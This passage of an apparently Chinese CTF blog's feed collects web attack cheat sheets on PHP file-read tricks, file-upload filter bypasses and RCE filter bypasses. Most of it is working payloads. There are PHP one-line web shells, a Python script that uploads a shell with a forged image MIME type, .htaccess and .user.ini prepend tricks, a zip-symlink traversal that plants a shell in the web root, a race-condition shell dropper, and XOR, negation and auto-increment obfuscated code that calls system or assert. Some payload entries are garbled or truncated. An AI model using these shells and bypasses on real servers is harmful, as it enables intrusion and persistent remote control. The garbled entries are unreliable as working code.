命令</h2><p>轮流循环绕过</p><pre><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/flag.php</code></pre><h2 id="file-get-contents-file-和-local-file">file_get_contents -&gt; file://和 local_file://</h2><p>读取常见目录</p><h2 id="system-命令读文件过滤了-和字母">system 命令读文件过滤了/和字母</h2><pre><code>$&#123;PWD%%[a-z]*&#125;可以在 url 上构造 /例如读到 flag 位置在 /_flag直接读取 $&#123;PWD%%[a-z]*&#125;_*</code></pre><h1 id="preg-match-返回-false-，利用-pcre">preg_match 返回 false ，利用 pcre</h1><p>必须用 POST 传参，GET 有字符上限。<br>pcre 原理为 preg_match 递归查找会限制字符长度，默认值为 1000000，如果超出会返回 bool(false)。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://example.com/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;t&quot;</span>: <span class="string">&quot;-&quot;</span> * <span class="number">1000001</span> + <span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>出不来可以适当增加字符长度。(有次把次数设成 1011451 就能过了，抽象)</p><h1 id="PHP-原生类">PHP 原生类</h1><pre><code>DirectoryIterator,FilesystemIterator,GlobIterator -&gt;可遍历目录类SplFileObject-&gt;读取文件类</code></pre><h2 id="使用范例-可配合-php-伪协议">使用范例(可配合 php 伪协议)</h2><h3 id="foreach">foreach</h3><pre><code>$text=new $a($b);foreach ($text as $tmp)&#123;    echo $tmp;&#125;a=DirectoryIterator&amp;b=/a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php</code></pre><h3 id="简略写法">简略写法</h3><pre><code>echo (new $a($b))-&gt;$c();//c可以省略a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php&amp;c=fgetsa=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php&amp;c=__toString</code></pre><h1 id="PHP-类名大小写">PHP 类名大小写</h1><p>php 对于类名大小写不敏感，A 和 a 都会认为是同一个类。</p><h1 id="…（更新中）">…（更新中）</h1>]]></content>
    
    
    <summary type="html">最特性的一集</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>upload常见考题类型</title>
    <link href="https://blog.hatchet.top/posts/6906b803.html"/>
    <id>https://blog.hatchet.top/posts/6906b803.html</id>
    <published>2024-09-21T04:37:18.000Z</published>
    <updated>2024-11-25T04:00:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端检测">前端检测</h1><p>屏蔽 js 脚本，或者用 python 直接上传<br>python 上传模版</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php&quot;</span></span><br><span class="line">file_content = <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">filename = <span class="string">&quot;a.php&quot;</span></span><br><span class="line">mime_type = <span class="string">&quot;image/png&quot;</span></span><br><span class="line">file = &#123;<span class="string">&quot;file&quot;</span>: (filename, file_content,mime_type)&#125;</span><br><span class="line">response = requests.post(url, files=file)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者按它的格式上传，在抓包时修改文件后缀</p><h1 id="检测-MIME-TYPE">检测 MIME_TYPE</h1><p>修改 Content-Type<br>jpg/png/gif: image/jpeg(png/gif)<br>zip: application/zip<br>在文件开头加 GIF89a 可绕过 getimagesize()</p><h1 id="php-一句话">php 一句话</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一般一句话</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">过滤php</span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">过滤<span class="meta">&lt;?</span></span><br><span class="line">  &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line">php开启短标签时</span><br><span class="line">  <span class="meta">&lt;?</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">  &lt;% <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);%&gt;</span><br><span class="line">过滤[]</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==&quot;</span>));<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">写马：</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;&lt;?=eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;z23.php&#x27;</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>);</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">最短一句话</span><br><span class="line">  <span class="meta">&lt;?=</span>`nl <span class="comment">/*`;</span></span><br></pre></td></tr></table></figure><h1 id="黑名单绕过">黑名单绕过</h1><h2 id="php-后缀绕过">php 后缀绕过</h2><p>pht,phpt,phps,phtml,php1,php2,php3,php4,php5,php7 都能解释为 php</p><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br>在上传文件的name参数后加url解码后的\x0A之后访问xxx.php%0A即可。<br><img src="/img/web/upload/image.png" alt=""></p><h2 id="htaccess">.htaccess</h2><p>两种方法</p><ol><li><p>替换后缀</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p>将 jpg 文件当作 php 文件解析</p><pre><code>SetHandler application/x-httpd-php</code></pre><p>将当前所有文件当作 php 文件解析</p><p>先上传.htaccess 提交<br>再上传 shell.jpg,直接访问 shell.jpg，服务器会识别为 php 文件</p></li><li><p>直接在开头/结尾写 php 文件,在适用于当前页面存在 php 文件<br>auto_prepend_file=a.jpg //在页面顶部加载文件<br>auto_append_file=a.jpg //在页面底部加载文件<br>url 传参</p><pre><code>?content=php_value+auto_prepend_fi\%0Ale+.htaccess%0A%23&lt;?=(`ls+/`);?&gt;%0A%23\</code></pre><p>如果被过滤在过滤词中间加%0A 使用换行绕过<br>上传文件直接写</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br><span class="line">#\</span><br></pre></td></tr></table></figure><pre><code>#是单行注释符号#\用于注释后面添加的字符#被过滤可以使用\x00#define width 1337#define height 1337用WEBP格式对getimagesize和exif_imagetype进行绕过</code></pre><h2 id="user-ini">.user.ini</h2><ul><li>如果 index.php 不在当前目录下,.user.ini 不生效</li></ul><p>直接在开头/结尾写 php 文件</p><pre><code>  auto_prepend_file=a.jpg //在页面顶部加载文件  auto_append_file=a.jpg //在页面底部加载文件  在a.jpg末尾写一句话就行  访问url/upload</code></pre><h2 id="文件名绕过">文件名绕过</h2><h3 id="00-绕过">%00 绕过</h3><p>构造类似 a.php%00.jpg,将%00 url 解码<br>PHP 版本小于 5.3.4 时，利用%00（结束符）来截断文件后缀名，%00 后的字符会被自动删除</p><h3 id="在后面加-或">在后面加.或/.</h3><p>php.<br>有些服务器会直接忽略后面的点，导致绕过黑名单</p><h2 id="使用-zip-文件特性">使用 zip 文件特性</h2><p>将 shell.php 压缩,修改后缀为 1.jpg,上传<br>如果存在读取参数?file=，可以使用 phar 读取<br>phar://./upload/1.jpg/shell.php<br>过滤不严可以用 file://和 php://filter 伪协议直接尝试读取 flag</p><h3 id="CISCN2023-unzip">CISCN2023-unzip</h3><p>利用软连接，进行目录穿越，将文件上传到任意目录</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var</span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">ln</span> -s /var/www/html <span class="built_in">link</span></span><br><span class="line">zip --symlinks exp1.zip <span class="built_in">link</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="built_in">link</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span> &gt; shell.php</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">zip -r exp2.zip <span class="built_in">link</span>/</span><br></pre></td></tr></table></figure><p>上传 exp1.zip,exp2.zip,服务器解压时把 shell.php 解压到/var/www/html。实现 getshell。</p><h2 id="文件内容无字母">文件内容无字母</h2><p>参考我的 RCE <a href="https://blog.hatchet.top/posts/26728343">各种 RCE 绕过</a><br>把开头的?&gt;去掉就可以用于文件上传,不要 url 编码</p><h1 id="条件竞争">条件竞争</h1><p>有些上传题允许上传 php 脚本，但会很快删除，我们只用构造一个生成 php 马的 php 文件不停上传这个 php 文件并访问，只要成功执行就能传马。</p><p>a.php</p><pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;, &quot;w&quot;), '&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;'); ?&gt;</code></pre><p>用 burp intruder，payload 选 null payload 无限，一个上传 a.php,一个读取 a.php。就能传上 shell.php</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前端检测&quot;&gt;前端检测&lt;/h1&gt;
&lt;p&gt;屏蔽 js 脚本，或者用 python 直接上传&lt;br&gt;
python 上传模版&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span </summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>各种RCE绕过</title>
    <link href="https://blog.hatchet.top/posts/26728343.html"/>
    <id>https://blog.hatchet.top/posts/26728343.html</id>
    <published>2024-09-20T12:54:21.000Z</published>
    <updated>2024-11-18T05:05:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些常见-RCE-形式">一些常见 RCE 形式</h1><pre><code>eval($_POST[1]);`$_GET[1]`;?&gt;&lt;?=`&#123;$&#123;_GET&#125;[1]&#125;`?&gt;</code></pre><h1 id="eval-assert-的-RCE">eval(),assert()的 RCE</h1><p>核心是写个一句话马让蚁剑去连</p><pre><code>?cmd=file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST['cmd']);?&gt;&quot;);?cmd=fputs(fopen('dotast.php','w'),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==\&quot;));?cmd=fwrite(fopen('phpinfo.php','a'),'&lt;?php%20phpinfo();?&gt;');?cmd=echo%20'&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;'%20&gt;%201.php?cmd=?&gt;&lt;?=`ls`;</code></pre><p>写 assert 时候蚁剑编码器选 base64</p><h1 id="无字母数字-RCE">无字母数字 RCE</h1><ul><li>因为$,+等会被 url 混淆，务必使用 url 编码特殊字符！！！</li></ul><h2 id="异或绕过">异或绕过</h2><pre><code>(&quot;%0f%08%0f%09%0e%06%0f&quot;^&quot;%7f%60%7f%60%60%60%60&quot;)(); //phpinfo();</code></pre><ul><li><p>assert($_POST[_]);//PHP version&lt;7.1</p><pre><code>$_=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>  $_=&quot;(\&quot;((%-&quot;^&quot;[[[\\@@&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[_]);</code></pre></li></ul><p>构造异或脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$result1</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$result2</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="取反绕过">取反绕过</h2><p>PHP7</p><pre><code>(~%8F%97%8F%96%91%99%90)(); //phpinfo(); 查看disable_functions(~%8C%86%8C%8B%9A%92)(~%93%8C);//system(&quot;ls&quot;);(~%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(~%D0%99%93%9E%98);//highlight_file(&quot;/flag&quot;);(~%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(~%8C%86%8C%8B%9A%92,~%88%97%90%9E%92%96); //call_user_func(system,whoami);</code></pre><p>构造取反脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload1</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload2</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload3</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;,~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload1</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload3</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP5</p><ul><li><p>assert($_POST[_]);//PHP version&lt;7.1</p><pre><code>$_=~%22%9e%8c%8c%9a%8d%8b%22;$__=~%22%a0%af%b0%ac%ab%22;$___=$$__;$_($___[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>$_=~&quot;%8C%86%8C%8B%9A%92&quot;;$__=~&quot;%a0%af%b0%ac%ab&quot;;$___=$$__;$_($___[_]);</code></pre></li></ul><h2 id="中文绕过-全部字符-url-编码">中文绕过(全部字符 url 编码))</h2><ul><li><p>assert($_POST[_]);//PHP version&lt;7.1</p><pre><code>?&gt;&lt;?=$_++;$__=&quot;极&quot;;$___=~($__&#123;$_&#125;);$__=&quot;区&quot;;$___.=~($__&#123;$_&#125;);$___.=~($__&#123;$_&#125;);$__=&quot;皮&quot;;$___.=~($__&#123;$_&#125;);$__=&quot;十&quot;;$___.=~($__&#123;$_&#125;);$__=&quot;勺&quot;;$___.=~($__&#123;$_&#125;);$____='_';$__=&quot;寸&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;小&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;欠&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;立&quot;;$____.=~($__&#123;$_&#125;);$_=$$____;$___($_[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>?&gt;&lt;?=$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];$_=$$____;$___($_[_]);</code></pre></li></ul><h2 id="自增绕过">自增绕过</h2><ul><li><p>system($_POST[_]);</p><pre><code>?&gt;&ltgt;</code></pre></li><li><p>assert($<em>POST[</em>]);</p><pre><code>?&gt;&lt;?=$_=[];$_=@&quot;$_&quotcode></pre></li><li><p>两个参数都自己控制</p><pre><code>  //post传参  cmd=$_=[]._;$__=$_['!'==','];$__++;$__++;$__++;$___=++$__;++$__;$___=++$__.$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$___=$___.++$__;$_='_'.$___;$$_[_]($$_[__]);  //get传参  ?_=system&amp;__=ls /</code></pre></li></ul><h3 id="长度限制">长度限制</h3><pre><code>$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);//长度118    $_GET[1]($_GET[2])</code></pre><h2 id="其他的杂项">其他的杂项</h2><h3 id="屏蔽了-导致-GET-POST-失效">屏蔽了_导致_GET,_POST 失效</h3><pre><code>异或a=?%3E%3C?=`&#123;$&#123;&quot;!%27%25(&quot;^&quot;%7e%60%60%7c&quot;&#125;[%a0]&#125;`?%3E&amp;%a0=whoami取反a=?%3E%3C?=`&#123;$&#123;~%22%a0%b8%ba%ab%22&#125;[%a0]&#125;`?%3E&amp;%a0=whoami</code></pre><h3 id="自增写马">自增写马</h3><pre><code>?&gt;&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____='_'?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_],$_[___])?&gt;POST部分__=file_put_contents&amp;_=shell.php&amp;___=&lt;?=eval($_POST['cmd'])?&gt;</code></pre><h1 id="无参数-RCE">无参数 RCE</h1><h2 id="构造-payload">构造 payload</h2><p>print_r(),var_dump()：输出函数<br>readfile(),highlight_file(),show_source()：读取文件<br>getcwd()：获取当前目录<br>pos(localeconv()),current(localeconv())：获取’.'字符<br>dirname()获取上层目录<br>scandir()等同 ls<br>chdir()改变目录，要和 dirname 搭配使用。例如：</p><pre><code>dirname(chdir(dirname(dirname(dirname(getcwd())))));</code></pre><ul><li>可以用 prev(),next(),reset(),end(),array_reverse()获取到 flag.php(仅限 flag.php 位于数组前后两位)，然后用 readfile()读取。</li></ul><h3 id="使用-arrar-rand-来获取-array-中的随机项">使用 arrar_rand()来获取 array 中的随机项</h3><pre><code>print_r(scandir(dirname(chdir(dirname(getcwd())))));//获取根目录文件highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))))//随机读取，多次读取得到flag</code></pre><h3 id="使用-session-值">使用 session 值</h3><pre><code>RCE部分：?exp=readfile(session_id(session_start()));PHPSESSID：PHPSESSID=flag.php</code></pre><h3 id="getenv">getenv()</h3><pre><code>在header最后写上sky:cat /flagprint_r(end(getallheaders()));system(end(getallheaders()));或者print_r(end(current(get_definded_vars((())))))&amp;sky=phpinfo();eval(end(current(get_definded_vars((())))))&amp;sky=phpinfo();</code></pre><h1 id="无字母数字参数-RCE">无字母数字参数 RCE</h1><p>phpinfo():[~%8F%97%8F%96%91%99%90][~%FF]();<br>加[~%FF]只是因为 php7 的解析方式，例如[~%EF],[~%CF]也能通过检测。<br>通过 getenv() RCE</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;end&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;getallheaders&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span>=<span class="string">&#x27;[~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;][!%FF]([~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;][!%FF]([~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>).<span class="string">&#x27;][!%FF]()));&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line"><span 